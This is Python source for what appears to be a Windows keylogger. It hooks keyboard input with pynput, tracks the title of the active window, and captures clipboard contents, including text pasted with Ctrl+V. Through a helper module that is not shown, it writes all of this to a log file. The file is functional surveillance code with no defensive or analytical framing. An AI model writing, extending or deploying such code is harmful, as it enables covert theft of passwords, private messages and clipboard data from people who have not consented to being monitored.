
from pynput.keyboard import Key, Listener
from pynput import mouse
from pynput import keyboard
import datetime
from functions import Skeleton
from win32gui import GetWindowText, GetForegroundWindow
import clipboard
from tkinter import Tk



class Program:

    def __init__(self):
        self.string = ""
        self.window = GetWindowText(GetForegroundWindow())
        self.time_first = datetime.datetime.now()
        self.clipboard = ""
        self.previous_key = ""

    def on_press(self, key):

        time_now = datetime.datetime.now()
        active_window = GetWindowText(GetForegroundWindow())
        time_difference_s = int((time_now - self.time_first).total_seconds())
        Skeleton().check_file_size()
        enter = str(key)
        key = str(key)
        key = Skeleton().format(key)

        if active_window != self.window:
            Skeleton().write_process_name(active_window)
            self.window = active_window

        if len(self.string) > 250 or time_difference_s > 29 or enter == "Key.enter":
            self.time_first = datetime.datetime.now()
            if Tk().clipboard_get() != self.clipboard:
                self.clipboard = Tk().clipboard_get()
                Skeleton().add_clipboard_to_file(self.clipboard)
            if len(self.string) < 1:
                self.string += key
            else:
                Skeleton().add_string_to_file(self.string)
                self.string = ""
        else:
            if key == "\\x16":
                key = " <u>[CTRL+V]" + self.clipboard + " [CTRL+V]</u> "
            if key == "\\x03":
                key = "[CTRL+C]"
            if key == "\\x01":
                key = "[CTRL+A]"
            self.string += key
        print(key)

        self.previous_key = key



    def on_click(self, x, y, button, pressed):
        pass
        # active_window = GetWindowText(GetForegroundWindow())

        # if Tk().clipboard_get() != self.clipboard:
        #     self.clipboard = Tk().clipboard_get()
        #     Skeleton().add_clipboard_to_file(self.clipboard)


# ==========================================================================================
# Listeners
# ==========================================================================================
# key_listener = keyboard.Listener(on_press=Program().on_press)
# key_listener.start()
# with mouse.Listener(on_click=Program().on_click) as listener:
#     listener.join()

with Listener(on_click=Program().on_click, on_press=Program().on_press) as listener:
    listener.join()
# ==========================================================================================


